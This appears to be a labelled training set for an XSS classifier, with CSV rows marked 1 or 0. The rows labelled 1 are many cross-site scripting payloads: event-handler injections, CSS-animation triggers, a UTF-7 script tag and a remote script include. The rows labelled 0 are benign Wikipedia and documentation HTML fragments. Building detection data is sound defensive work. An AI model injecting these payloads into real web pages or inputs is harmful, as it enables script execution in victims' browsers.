title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Neurocomputing&amp;rft.atitle=A+world+survey+of+artificial+brain+projects%2C+Part+II%3A+Biologically+inspired+cognitive+architectures&amp;rft.volume=74&amp;rft.issue=1%E2%80%933&amp;rft.pages=30-49&amp;rft.date=2010-12&amp;rft_id=info%3Adoi%2F10.1016%2Fj.neucom.2010.08.012&amp;rft.aulast=Goertzel&amp;rft.aufirst=Ben&amp;rft.au=Lian%2C+Ruiting&amp;rft.au=Arel%2C+Itamar&amp;rft.au=de+Garis%2C+Hugo&amp;rft.au=Chen%2C+Shuo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> </li>",0
+"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",1
+"<marquee onmousemove=""alert(1)"">test</marquee>",1
+<menu onpointerleave=alert(1)>XSS</menu>,1
+"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",1
+"<isindex onmouseenter=""alert(1)"">test</isindex>",1
+"<summary onbeforecopy=""alert(1)"" contenteditable>test</summary>",1
+<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>,1
+"<img onbeforecopy=""alert(1)"" contenteditable>test</img>",1
+"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a> ",0
+	 </span>(2007) </li>,0
+"<code onclick=""alert(1)"">test</code>",1
+"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",0
+<dt onpointerout=alert(1)>XSS</dt>,1
+"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",1
+"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/cs.CV"">cs.CV </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Show+and+Tell%3A+A+Neural+Image+Caption+Generator&amp;rft.date=2015&amp;rft_id=info%3Aarxiv%2F1411.4555&amp;rft.aulast=Vinyals&amp;rft.aufirst=Oriol&amp;rft.au=Toshev%2C+Alexander&amp;rft.au=Bengio%2C+Samy&amp;rft.au=Erhan%2C+Dumitru&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",1
+"<form onmouseup=""alert(1)"">test</form>",1
+<tfoot onpointerover=alert(1)>XSS</tfoot>,1
+"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",1
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=the+Guardian&amp;rft.atitle=Google%27s+DeepMind+makes+AI+program+that+can+learn+like+a+human&amp;rft.date=2017-03-14&amp;rft.aulast=Sample&amp;rft.aufirst=Ian&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Fglobal%2F2017%2Fmar%2F14%2Fgoogles-deepmind-makes-ai-program-that-can-learn-like-a-human&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<output onpointerout=alert(1)>XSS</output>,1
+"<li id=""cite_note-HC-369""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-HC_369-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-HC_369-1""><sup><i><b>b </b> </i> </sup> </a> ",0
+"	 </span> <span class=""toctext"">Autonomous weapons ",0
+"<data oncopy=""alert(1)"" contenteditable>test</data>",1
+	 </span> 2008 ,0
+<main onpointerout=alert(1)>XSS</main>,1
+<strong id=x tabindex=1 onfocus=alert(1)></strong>,1
+	 </span> </a>,0
+"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1
+<label id=x tabindex=1 onfocusin=alert(1)></label>,1
+"<table onpaste=""alert(1)"" contenteditable>test</table>",1
+"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",1
+"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('');+ADw-/SCRIPT+AD4-",1
+"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,1
+"<main onkeypress=""alert(1)"" contenteditable>test</main>",1
+<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,1
+"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>",1
+"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>",1
+"<track onkeyup=""alert(1)"" contenteditable>test</track>",1
+"<li><a href=""/wiki/Galileo_Galilei"" title=""Galileo Galilei"">Galileo Galilei </a> </li>",0
+"<option onmouseout=""alert(1)"">test</option>",1
+"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>",1
+"<li class=""toclevel-2 tocsection-13""><a href=""#General_intelligence""><span class=""tocnumber"">4.9 ",0
+<ol id=x tabindex=1 onfocus=alert(1)></ol>,1
+"<li class=""toclevel-3 tocsection-62""><a href=""#Computationalism_and_functionalism""><span class=""tocnumber"">8.4.2 ",0
+<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,1
+"<li><cite id=""CITEREFO&#39;Connor1994"" class=""citation journal"">O'Connor, Kathleen Malone (1994). <a rel=""nofollow"" class=""external text"" href=""http://repository.upenn.edu/dissertations/AAI9503804"">""The alchemical creation of life (takwin) and other concepts of Genesis in medieval Islam"" </a>. <i>Dissertations Available from ProQuest </i>. University of Pennsylvania: 1–435. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Dissertations+Available+from+ProQuest&amp;rft.atitle=The+alchemical+creation+of+life+%28takwin%29+and+other+concepts+of+Genesis+in+medieval+Islam&amp;rft.pages=1-435&amp;rft.date=1994&amp;rft.aulast=O%27Connor&amp;rft.aufirst=Kathleen+Malone&amp;rft_id=http%3A%2F%2Frepository.upenn.edu%2Fdissertations%2FAAI9503804&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<noembed id=x tabindex=1 onbeforeactivate=alert(1)></noembed>,1
+"<s draggable=""true"" ondragenter=""alert(1)"">test</s>",1
+<font onpointerleave=alert(1)>XSS</font>,1
+"<li id=""cite_note-296""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-296"">^ </a> </b> ",0
+<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,1
+"<style>:target {transform: rotate(180deg);}</style><li id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></li>",1
+"<li id=""cite_note-Propositional_logic-197""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Propositional_logic_197-0"">^ </a> </b> ",0
+"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",1
+"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",1
+"Revival of <a href=""/wiki/Connectionism"" title=""Connectionism"">connectionism </a>:",0
+"<object onkeyup=""alert(1)"" contenteditable>test</object>",1
+"<li><a href=""#CITEREFNewquist1994"">Newquist 1994 </a>, pp.&#160;235–248 </li> </ul>",0
+"<label onmousedown=""alert(1)"">test</label>",1
+<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,1
+<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,1
+"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",1
+"<kbd draggable=""true"" ondragenter=""alert(1)"">test</kbd>",1
+"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Existential_risk_from_artificial_intelligence"" title=""Template:Existential risk from artificial intelligence""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Existential_risk_from_artificial_intelligence"" title=""Template talk:Existential risk from artificial intelligence""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Existential_risk_from_artificial_intelligence&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blockquote>",1
+"<style>@keyframes slidein {}</style><bgsound style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bgsound>",1
+<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,1
+"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mckinsey.com/business-functions/mckinsey-analytics/our-insights/ask-the-ai-experts-whats-driving-todays-progress-in-ai"">""Ask the AI experts: What's driving today's progress in AI?"" </a>. <i>McKinsey &amp; Company </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 April ",0
+"<audio onmouseenter=""alert(1)"">test</audio>",1
+<select autofocus onfocus=alert(1)>,1
+<body onbeforeprint=alert(1)>,1
+"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;212–213 </li>",0
+"<menuitem draggable=""true"" ondrag=""alert(1)"">test</menuitem>",1
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1
+"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",1
+<thead onpointerleave=alert(1)>XSS</thead>,1
+<sub id=x tabindex=1 onfocusin=alert(1)></sub>,1
+"<style>@keyframes x{}</style><br style=""animation-name:x"" onanimationstart=""alert(1)""></br>",1
+"<li><a href=""/wiki/Speech_recognition"" title=""Speech recognition"">Speech recognition </a> </li> </ul> </li>",0
+"<hgroup onbeforecopy=""alert(1)"" contenteditable>test</hgroup>",1
+"<strike oncut=""alert(1)"" contenteditable>test</strike>",1
+"<style>@keyframes x{}</style><a style=""animation-name:x"" 									onanimationend=""alert(1)""></a>",1
+"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",1
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;269–271 </li> </ul>",0
+"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",1
+"<p>If research into <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">Strong AI </a> produced sufficiently intelligent software, it might be able to reprogram and improve itself. The improved software would be even better at improving itself, leading to <a href=""/wiki/Intelligence_explosion"" class=""mw-redirect"" title=""Intelligence explosion"">recursive self-improvement </a>.<sup id=""cite_ref-recurse_409-0"" class=""reference""><a href=""#cite_note-recurse-409"">&#91;397&#93; </a> </sup> The new intelligence could thus increase exponentially and dramatically surpass humans. Science fiction writer <a href=""/wiki/Vernor_Vinge"" title=""Vernor Vinge"">Vernor Vinge </a> named this scenario ""<a href=""/wiki/Technological_singularity"" title=""Technological singularity"">singularity </a>"".<sup id=""cite_ref-Singularity_410-0"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup> Technological singularity is when accelerating progress in technologies will cause a runaway effect wherein artificial intelligence will exceed human intellectual capacity and control, thus radically changing or even ending civilization. Because the capabilities of such an intelligence may be impossible to comprehend, the technological singularity is an occurrence beyond which events are unpredictable or even unfathomable.<sup id=""cite_ref-Singularity_410-1"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup><sup id=""cite_ref-Roberts_147-2"" class=""reference""><a href=""#cite_note-Roberts-147"">&#91;144&#93; </a> </sup>",0
+"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",1
+<img2 onpointerup=alert(1)>XSS</img2>,1
+"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",1
+"<div draggable=""true"" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>",1
+"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",1
+"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>",1
+"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",1
+"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",1
+<i onpointerup=alert(1)>XSS</i>,1
+<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>,1
+<animatetransform onpointerover=alert(1)>XSS</animatetransform>,1
+"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",1
+<hr onpointerdown=alert(1)>XSS</hr>,1
+<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,1
+"	 </span> <span class=""toctext"">Challenges ",0
+"<a href=""/wiki/First-order_logic"" title=""First-order logic"">First-order logic </a> and features such as <a href=""/wiki/Equality_(mathematics)"" title=""Equality (mathematics)"">equality </a>:",0
+" </p><p>One main factor that influences the ability for a driver-less automobile to function is mapping. In general, the vehicle would be pre-programmed with a map of the area being driven. This map would include data on the approximations of street light and curb heights in order for the vehicle to be aware of its surroundings. However, Google has been working on an algorithm with the purpose of eliminating the need for pre-programmed maps and instead, creating a device that would be able to adjust to a variety of new surroundings.<sup id=""cite_ref-311"" class=""reference""><a href=""#cite_note-311"">&#91;300&#93; </a> </sup> Some self-driving cars are not equipped with steering wheels or brake pedals, so there has also been research focused on creating an algorithm that is capable of maintaining a safe environment for the passengers in the vehicle through awareness of speed and driving conditions.<sup id=""cite_ref-312"" class=""reference""><a href=""#cite_note-312"">&#91;301&#93; </a> </sup>",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Machine_ethics"" title=""Machine ethics"">Machine ethics </a> </div>",0
+"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionend=alert(1)></col>",1
+"<li><a href=""/wiki/Functional_contextualism"" title=""Functional contextualism"">Functional contextualism </a> </li> </ul>",0
+<b onpointerout=alert(1)>XSS</b>,1
+"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",1
+"<li>take the center square if it is free. Otherwise, </li>",0
+"			<ul><li id=""coll-create_a_book""><a href=""/w/index.php?title=Special:Book&amp;bookcmd=book_creator&amp;referer=Artificial+intelligence"">Create a book </a> </li><li id=""coll-download-as-rl""><a href=""/w/index.php?title=Special:ElectronPdf&amp;page=Artificial+intelligence&amp;action=show-download-screen"">Download as PDF </a> </li><li id=""t-print""><a href=""/w/index.php?title=Artificial_intelligence&amp;printable=yes"" title=""Printable version of this page [p]"" accesskey=""p"">Printable version </a> </li> </ul>",0
+<applet onpointerover=alert(1)>XSS</applet>,1
+<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,1
+"<noscript onbeforecopy=""alert(1)"" contenteditable>test</noscript>",1
+"<li id=""cite_note-recurse-409""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-recurse_409-0"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;204 ",0
+"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",1
+"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",1
+"      <span class=""fa fa-book""> Read the Docs",0
+<map onpointerover=alert(1)>XSS</map>,1
+"<li><a href=""/wiki/Educational_technology"" title=""Educational technology"">Educational technology </a> </li>",0
+"<rb onkeypress=""alert(1)"" contenteditable>test</rb>",1
+<title id=x tabindex=1 onfocus=alert(1)></title>,1
+"<li><a href=""/wiki/David_Hume"" title=""David Hume"">David Hume </a> </li> </ul>",0
+"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></i>",1
+"<li><a href=""/wiki/Memex"" title=""Memex"">Memex </a><span class=""nowrap"">&#160; ",0
+<kbd onpointerdown=alert(1)>XSS</kbd>,1
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=42"" title=""Edit section: Video games"">edit </a><span class=""mw-editsection-bracket"">] ",0
+<main onpointerenter=alert(1)>XSS</main>,1
+"<div role=""navigation"" class=""navbox"" aria-labelledby=""Computer_science"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0
+"<li><a href=""/wiki/Idea"" title=""Idea"">Idea </a> </li>",0
+"<li id=""cite_note-The_mathematical_objection-357""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-The_mathematical_objection_357-0"">^ </a> </b> ",0
+<SCRIPT SRC=//.rocks/.j>,1
+"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",1
+<cite onpointermove=alert(1)>XSS</cite>,1
+"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",1
+"	 </span> <span class=""reference-text"">",0
+"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",1
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=67"" title=""Edit section: Transhumanism"">edit </a><span class=""mw-editsection-bracket"">] ",0
+<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,1
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=South+China+Morning+Post&amp;rft.atitle=Will+your+job+still+exist+in+10+years+when+the+robots+arrive%3F&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fwww.scmp.com%2Ftech%2Finnovation%2Farticle%2F2098164%2Frobots-are-coming-here-are-some-jobs-wont-exist-10-years&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<ins onmousemove=""alert(1)"">test</ins>",1
+<meta onpointerout=alert(1)>XSS</meta>,1
+"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",1
+<s onpointerenter=alert(1)>XSS</s>,1
+"<isindex onmouseout=""alert(1)"">test</isindex>",1
+"<p>Advancements in AI have contributed to the growth of the automotive industry through the creation and evolution of self-driving vehicles. As of 2016<sup class=""plainlinks noexcerpt noprint asof-tag update"" style=""display:none;""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;action=edit"">&#91;update&#93; </a> </sup>, there are over 30 companies utilizing AI into the creation of <a href=""/wiki/Self-driving_car"" title=""Self-driving car"">self-driving cars </a>. A few companies involved with AI include <a href=""/wiki/Tesla_Motors"" class=""mw-redirect"" title=""Tesla Motors"">Tesla </a>, <a href=""/wiki/Google"" title=""Google"">Google </a>, and <a href=""/wiki/Apple_Inc."" title=""Apple Inc."">Apple </a>.<sup id=""cite_ref-307"" class=""reference""><a href=""#cite_note-307"">&#91;296&#93; </a> </sup>",0
+"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>",1
+"<li id=""cite_note-Reinforcement_learning-119""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Reinforcement_learning_119-0"">^ </a> </b> ",0
+"<table onkeyup=""alert(1)"" contenteditable>test</table>",1
+"<li><a href=""/wiki/Herbert_Spencer"" title=""Herbert Spencer"">Herbert Spencer </a> </li>",0
+"	 </span> <span class=""reference-text""><a href=""/wiki/Rina_Dechter"" title=""Rina Dechter"">Rina Dechter </a> (1986). Learning while searching in constraint-satisfaction problems. University of California, Computer Science Department, Cognitive Systems Laboratory.<a rel=""nofollow"" class=""external text"" href=""https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160419054654/https://www.researchgate.net/publication/221605378_Learning_While_Searching_in_Constraint-Satisfaction-Problems"">Archived </a> 19 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0
+"<slot draggable=""true"" ondragstart=""alert(1)"">test</slot>",1
+"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",1
+&#x00003C,1
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_intelligence_in_government"" title=""Artificial intelligence in government"">Artificial intelligence in government </a> </div>",0
+<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,1
+<samp id=x tabindex=1 onfocus=alert(1)></samp>,1
+"<body onbeforeunload=""location='javascript:alert(1)'"">",1
+"<li id=""cite_note-395""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-395"">^ </a> </b> ",0
+<li id=x tabindex=1 onfocusin=alert(1)></li>,1
+<del onpointerleave=alert(1)>XSS</del>,1
+"<ul><li><a href=""#CITEREFMcCarthyHayes1969"">McCarthy &amp; Hayes 1969 </a> </li>",0
+	 </span></a></dt><dd>See what has changed in recent Scrapy versions.</dd>,0
+"<q onmouseleave=""alert(1)"">test</q>",1
+<q onpointerenter=alert(1)>XSS</q>,1
+"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",1
+"<li id=""cite_note-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006-291""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006_291-0"">^ </a> </b> ",0
+"<embed onclick=""alert(1)"">test</embed>",1
+"	 </span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""https://dl.acm.org/citation.cfm?id=3204480.3186697"">Retrieved July 29 </a> ",0
+<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,1
+"<p>The relationship between automation and employment is complicated. While automation eliminates old jobs, it also creates new jobs through micro-economic and macro-economic effects.<sup id=""cite_ref-384"" class=""reference""><a href=""#cite_note-384"">&#91;373&#93; </a> </sup> Unlike previous waves of automation, many middle-class jobs may be eliminated by artificial intelligence; <i><a href=""/wiki/The_Economist"" title=""The Economist"">The Economist </a> </i> states that ""the worry that AI could do to white-collar jobs what steam power did to blue-collar ones during the Industrial Revolution"" is ""worth taking seriously"".<sup id=""cite_ref-385"" class=""reference""><a href=""#cite_note-385"">&#91;374&#93; </a> </sup> Subjective estimates of the risk vary widely; for example, Michael Osborne and <a href=""/wiki/Carl_Benedikt_Frey"" title=""Carl Benedikt Frey"">Carl Benedikt Frey </a> estimate 47% of U.S. jobs are at ""high risk"" of potential automation, while an OECD report classifies only 9% of U.S. jobs as ""high risk"".<sup id=""cite_ref-386"" class=""reference""><a href=""#cite_note-386"">&#91;375&#93; </a> </sup><sup id=""cite_ref-387"" class=""reference""><a href=""#cite_note-387"">&#91;376&#93; </a> </sup><sup id=""cite_ref-388"" class=""reference""><a href=""#cite_note-388"">&#91;377&#93; </a> </sup> Jobs at extreme risk range from paralegals to fast food cooks, while job demand is likely to increase for care-related professions ranging from personal healthcare to the clergy.<sup id=""cite_ref-389"" class=""reference""><a href=""#cite_note-389"">&#91;378&#93; </a> </sup> Author <a href=""/wiki/Martin_Ford_(author)"" title=""Martin Ford (author)"">Martin Ford </a> and others go further and argue that many jobs are routine, repetitive and (to an AI) predictable; Ford warns that these jobs may be automated in the next couple of decades, and that many of the new jobs may not be ""accessible to people with average capability"", even with retraining. Economists point out that in the past technology has tended to increase rather than reduce total employment, but acknowledge that ""we're in uncharted territory"" with AI.<sup id=""cite_ref-guardian_jobs_debate_24-1"" class=""reference""><a href=""#cite_note-guardian_jobs_debate-24"">&#91;24&#93; </a> </sup>",0
+"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>",1
+"<summary oncopy=""alert(1)"" contenteditable>test</summary>",1
+<input4 onpointerout=alert(1)>XSS</input4>,1
+"<li><a href=""#CITEREFDyson1998"">Dyson 1998 </a> </li> </ul>",0
+<tt onpointerenter=alert(1)>XSS</tt>,1
+<header id=x tabindex=1 onfocus=alert(1)></header>,1
+"<dl oncut=""alert(1)"" contenteditable>test</dl>",1
+"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",1
+<option onpointerover=alert(1)>XSS</option>,1
+"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></marquee>",1
+"    <script type=""text/javascript"" src=""_static/js/theme.js""></script>",0
+"<command draggable=""true"" ondrag=""alert(1)"">test</command>",1
+"<cite onclick=""alert(1)"">test</cite>",1
+"<image draggable=""true"" ondragend=""alert(1)"">test</image>",1
+"<li id=""cite_note-329""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-329"">^ </a> </b> ",0
+<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,1
+<dt onpointerdown=alert(1)>XSS</dt>,1
+<figure onpointerenter=alert(1)>XSS</figure>,1
+"<li id=""cite_note-FOOTNOTERussellNorvig200318-34""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig200318_34-0"">^ </a> </b> ",0
+"<font onmouseleave=""alert(1)"">test</font>",1
+"<a href=""/wiki/Propositional_logic"" class=""mw-redirect"" title=""Propositional logic"">Propositional logic </a>:",0
+"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",1
+"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",1
+"<noscript onmouseup=""alert(1)"">test</noscript>",1
+<form><textarea oninvalid=alert(1) required><input type=submit>,1
+"<li><cite id=""CITEREFvan_der_WaltBernard2006"" class=""citation web"">van der Walt, Christiaan; Bernard, Etienne (2006). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20090325194051/http://www.patternrecognition.co.za/publications/cvdwalt_data_characteristics_classifiers.pdf"">""Data characteristics that determine classifier performance"" </a> <span class=""cs1-format"">(PDF) ",0
+"<li id=""cite_note-143""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-143"">^ </a> </b> ",0
+<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1
+<svg><set onend=alert(1) attributename=x dur=1s>,1
+	 </span></a>,0
+"	 <div class=""magnify""><a href=""/wiki/File:Hierarchical-control-system.svg"" class=""internal"" title=""Enlarge""> </a> </div>A <a href=""/wiki/Hierarchical_control_system"" title=""Hierarchical control system"">hierarchical control system </a> is a form of <a href=""/wiki/Control_system"" title=""Control system"">control system </a> in which a set of devices and governing software is arranged in a hierarchy. </div> </div> </div>",0
+"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",1
+"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=11"" title=""Edit section: Motion and manipulation"">edit </a>",0
+"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>",1
+AI becomes hugely successful in the early 21st century,0
+"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",1
+"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",1
+"<style onmouseover=""alert(1)"">test</style>",1
+"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0
+"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" ontransitionend=alert(1)></details>",1
+"<input onmouseenter=""alert(1)"">test</input>",1
+"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",1
+"<isindex onmouseleave=""alert(1)"">test</isindex>",1
+"<summary onpaste=""alert(1)"" contenteditable>test</summary>",1
+"<li><cite id=""CITEREFMoravec1988"" class=""citation book""><a href=""/wiki/Hans_Moravec"" title=""Hans Moravec"">Moravec, Hans </a> (1988). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/mindchildrenfutu00mora""><i>Mind Children </i> </a> ",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=40"" title=""Edit section: Government"">edit </a><span class=""mw-editsection-bracket"">] ",0
+<keygen onpointerdown=alert(1)>XSS</keygen>,1
+"<em onbeforecut=""alert(1)"" contenteditable>test</em>",1
+"<input onkeydown=""alert(1)"" contenteditable>test</input>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></output>",1
